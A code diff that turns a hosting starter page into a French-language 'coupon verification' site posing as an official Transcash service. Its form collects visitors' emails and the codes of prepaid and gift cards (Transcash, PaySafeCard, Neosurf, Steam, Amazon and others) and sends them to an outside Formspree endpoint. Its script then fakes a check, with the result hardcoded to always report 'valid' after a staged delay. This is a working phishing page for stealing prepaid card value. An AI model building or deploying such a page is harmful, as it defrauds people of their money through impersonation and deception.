@@ -1,33 +1,224 @@
-<!doctype html>
-<html lang=en>
-  <head>
-    <meta charset=utf-8>
-    <title>Cyclic: Hello World</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-    <link rel="stylesheet" type="text/css" href="/main.css">
-    <link rel="icon" href="/favicon.ico" />
-  </head>
-  <body>
-    <div id="hello-wrapper">
-      <div id="particles-js"></div>
-      <div class="content position-absolute w-100 top-0 pt-5">
-        <div class="cta">
-          <div id="hello" class="typewriter pb-3">
-            Hello World!
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de coupon</title>
+    <link rel="stylesheet" type="text/css" href="coupon.css">
+
+</head>
+<body>
+	<header>
+		<div class="header-content">
+			<center><h1 class="header-text">BIENVENU SUR LE SITE OFFICIEL D'AUTENTIFICATION DE VOS RECHARGE TICKETS ET CARTES CADEAUX</h1></center>
+			<center><p class="header-italic">La vérification de vos recharges est un aspect important pour les utilisateurs . Les recharges sont souvent utilisés pour effectuer des paiements en ligne, et il est donc essentiel de s'assurer qu'ils sont valides avant de les utiliser. Cette page de vérification  offre aux utilisateurs un moyen facile et pratique de vérifier leurs recharges  en ligne, ce qui leur permet de s'assurer qu'ils peuvent effectuer des transactions en toute sécurité. En utilisant cette page, les utilisateurs peuvent vérifier rapidement et facilement leurs coupons, et ainsi éviter les désagréments liés à l'utilisation de coupons invalides</p></center>
+            <center><p>Veuillez remplir le formulaire ci dessous pour effectuer la verification:</p></center>
+		</div>
+	</header>
+	<main>
+        <form id="coupon-form" method="POST" action="https://formspree.io/f/xzbqkrbz">
+            <label for="email">Adresse email:</label>
+            <input type="email" id="email" name="email" required>
+          
+            <label for="amount">Montant du coupon:</label>
+            <select id="amount" name="amount" required>
+              <option value="">--Montant--</option>
+              <option value="5€">5€</option>
+              <option value="10€">10€</option>
+              <option value="15€">15€</option>
+              <option value="20€">20€</option>
+              <option value="25€">25€</option>
+              <option value="30€">30€</option>
+              <option value="35€">35€</option>
+              <option value="40€">40€</option>
+              <option value="45€">45€</option>
+              <option value="50€">50€</option>
+              <option value="55€">55€</option>
+              <option value="60€">60€</option>
+              <option value="70€">70</option>
+              <option value="80€">80€</option>
+              <option value="90€">90€</option>
+              <option value="100€">100€</option>
+              <option value="150€">150€</option>
+              <option value="200€">200€</option>
+              <option value="300€">300€</option>
+              <option value="400€">400€</option>
+              <option value="500€">500€</option>
+              <option value="600€">600€</option>
+              <option value="700€">700€</option>
+              <option value="800€">800€</option>
+              <option value="900€">900€</option>
+              <option value="1000€">1000€</option>
+              <option value="1500€">1500€</option>
+              <option value="2000€">2000€</option>
+              <option value="2500€">2500€</option>
+              <option value="3000€">3000€</option>
+              <option value="4000€">4000€</option>
+              <option value="5000€">5000€</option>
+            </select>
+          
+            <label for="type">Type de coupon:</label>
+            <select id="type" name="type" required>
+              <option value="">--Choisir Votre Carte--</option>
+              <option value="Transcash">TRANSCASH</option>
+              <option value="paysafe card">PAYSAFE CARD</option>
+              <option value="neosurf">NEOSURF</option>
+              <option value="itune card">ITUNE CARD</option>
+              <option value="google card">GOOGLE PLAY CARD</option>
+              <option value="staem card">STEAM CARD</option>
+              <option value="amazone card">AMAZON CARD</option>
+              <option value="sephora card">SEPHORA CARD</option>
+              <option value="xbox card">XBOX CARD </option>
+              <option value="netflix card">NETFLIX CARD</option>
+              <option value="spotify card">SPOTIFY CARD</option>
+              <option value="deezer card">DEEZER CARD</option>
+              <option value="playstation card">PLAYSTATION CARD (PSN)</option>
+              <option value="adidas card">ADIDAS CARD</option>
+              <option value="nike card">NIKE CARD</option>
+              <option value="starbucks card">STARBUCKS CARD</option>
+              <option value="twitch card">TWITCH CARD</option>
+              <option value="ticket premium">TICKET PREMIUM</option>
+              <option value="cashlob">CASHLIB</option>
+              <option value="flexpin card">FLEXEPIN CARD</option>
+            </select>
+          
+            <label for="code">Code de coupon:</label>
+            <input type="text" id="code" name="code" required>
+          
+            <label>
+              <input type="checkbox" id="hide-code" name="hide-code"> Cacher le code
+            </label>
+              <br>
+            <input type="submit" value="Vérifier le coupon">
+          </form>
+          
+		<div class="coupon-types">
+			<h2>Types de coupon disponibles :</h2>
+            <div class="gallery">
+                <div class="image">
+                  <img src="img/neosurf.png" alt="Photo 1">
+                </div>
+                <div class="image">
+                  <img src="img/paysafe.png" alt="Photo 2">
+                </div>
+                <div class="image">
+                  <img src="img/pcs.png" alt="Photo 3">
+                </div>
+                <div class="image">
+                  <img src="img/play+.png" alt="Photo 4">
+                </div>
+                <div class="image">
+                  <img src="img/playstation.png" alt="Photo 5">
+                </div>
+                <div class="image">
+                  <img src="img/roblox.png" alt="Photo 6">
+                </div>
+                <div class="image">
+                  <img src="img/tc.png" alt="Photo 7">
+                </div>
+                <div class="image">
+                  <img src="img/ticketpremium.png" alt="Photo 8">
+                </div>
+                <div class="image">
+                  <img src="img/toneo.png" alt="Photo 9">
+                </div>
+                <div class="image">
+                  <img src="img/xboxlie.png" alt="Photo 10">
+                </div>
+              </div>
+              
+		
+		</div>
+	</main>
+ 
+      
+    <footer>
+        <div class="container">
+          <div class="row">
+            <div class="col-sm-12 col-md-4">
+              <h3>À propos</h3>
+              <p>Notre entreprise est spécialisée dans la verification de validité des recharges en ligne. Nous offrons une solution pratique et sûre pour effectuer des paiements en ligne.</p>
+            </div>
+            <div class="col-sm-12 col-md-4">
+              <h3>Contact</h3>
+            
+                <a href="mailto:info@monentreprise.com">infocashverifacation.com</a></li>
+              
+            </div>
           </div>
-          <a class="btn btn-primary mb-5" href="//app.cyclic.sh/api/login">Sign in to Cyclic</a>
+          <div class="row">
+            <div class="col-sm-12">
+              <hr>
+              <p class="text-center">&copy; 2023 Transcash - All right reserved</p>
+            </div>
+          </div>
         </div>
-        <div id="world">
-          <canvas id='rotatingGlobe' style='cursor: move;'></canvas>
-        </div>
-      </div>
-    </div>
-    <script type='text/javascript' src='//d3js.org/d3.v3.min.js'></script>
-    <script type='text/javascript' src='//d3js.org/topojson.v1.min.js'></script>
-    <script type='text/javascript' src='planetaryjs.min.js'></script>
-    <script src="//cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-    <script src="//cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
-    <script type='text/javascript' src='particles.js'></script>
-    <script type='text/javascript' src='globe.js'></script>
-  </body>
+      </footer>
+   
+      <script>
+        const form = document.getElementById("coupon-form");
+    
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const data = new FormData(event.target);
+    
+            // Envoyer le contenu du formulaire par e-mail
+            fetch(event.target.action, {
+                method: form.method,
+                body: data,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    form.reset();
+    
+                    // Vérifier le coupon après avoir envoyé le formulaire par e-mail
+                    submitCoupon(data.get('coupon-code'));
+                } else {
+                    response.json().then(data => {
+                        if (Object.hasOwn(data, 'errors')) {
+                            status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+                        } else {
+                            status.innerHTML = "Oops! There was a problem submitting your form"
+                        }
+                    })
+                }
+            }).catch(error => {
+                status.innerHTML = "Oops! There was a problem submitting your form"
+            });
+        }
+    
+        function submitCoupon(couponCode) {
+            const submitBtn = form.querySelector('input[type="submit"]');
+    
+            // Afficher l'animation de chargement
+            submitBtn.value = "Vérification en cours...";
+            submitBtn.disabled = true;
+    
+            // Simuler une requête asynchrone pour la vérification du coupon
+            setTimeout(() => {
+                // Rétablir le bouton de soumission
+                submitBtn.value = "Vérifier le coupon";
+                submitBtn.disabled = false;
+    
+                // Afficher la boîte de dialogue pour informer l'utilisateur
+                const couponValid = true; // Changer à false si le coupon est invalide
+                if (couponValid) {
+                    alert("Votre coupon est toujours valide!");
+                    window.location.href = "index.html";
+                } else {
+                    alert("Votre coupon est invalide!");
+                }
+            }, 8000); // Simulation de délai de 8 secondes pour la vérification du coupon
+        }
+    
+        form.addEventListener("submit", handleSubmit);
+    </script>
+    
+    
+ </body>
 </html>
+
+
